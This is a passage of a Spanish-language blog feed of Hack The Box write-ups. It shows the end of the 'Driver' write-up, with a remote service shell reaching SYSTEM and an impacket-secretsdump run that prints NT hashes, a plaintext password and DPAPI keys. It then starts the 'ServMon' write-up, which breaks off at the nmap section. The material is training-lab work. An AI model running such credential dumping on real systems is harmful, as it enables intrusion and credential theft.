&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file boxhjDuT.exe
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on driver.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating service Czhp on driver.htb.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service Czhp.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.10240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;81d19370a4924a68&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ impacket-secretsdump sckull:sckullx123@driver.htb
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Service RemoteRegistry is in stopped state
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Service RemoteRegistry is disabled, enabling it
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service RemoteRegistry
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; SAM hashes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uid:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
sckull:1004:aad3b435b51404eeaad3b435b51404ee:44198dfc6b720ccdd3323386972d127e:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping cached domain logon information &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain/username:hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping LSA Secrets
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DefaultPassword
DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony:liltony
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DPAPI_SYSTEM
dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e
dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stopping service RemoteRegistry
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Restoring the disabled state &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; service RemoteRegistry
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;cd2f290d04244578\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/driver/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/driver/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>scf</category>
            
          
            
              <category>winrm</category>
            
          
            
              <category>printnightmare</category>
            
          
            
              <category>powershell</category>
            
          
            
              <category>responder</category>
            
          
            
              <category>winpeas</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - ServMon</title>
        <link>https://sckull.github.io/posts/servmon/</link>
        <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 14 May 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/servmon/</guid>
        <description>ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/240&#34;&gt;ServMon&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.184&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/82600&#34;&gt;del_KZx497Ju&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/82600&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[5, 4.8, 7.4, 2.6, 5.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ss h(22), http (80), smb (139, 445), RPC (135).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
